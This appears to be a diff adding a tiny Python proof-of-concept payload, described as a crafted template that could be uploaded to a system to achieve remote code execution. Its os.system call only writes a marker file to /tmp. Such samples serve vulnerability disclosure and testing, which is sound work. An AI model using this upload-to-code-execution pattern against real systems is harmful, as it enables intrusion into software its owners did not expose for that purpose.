@@ -1,0 +1,11 @@
+```python
+# This is an example of a crafted template that could be uploaded to achieve remote code execution.
+
+# payload.py
+import os
+
+def execute():
+    os.system('echo Vulnerability exploited! > /tmp/exploit.txt')
+
+execute()
+```
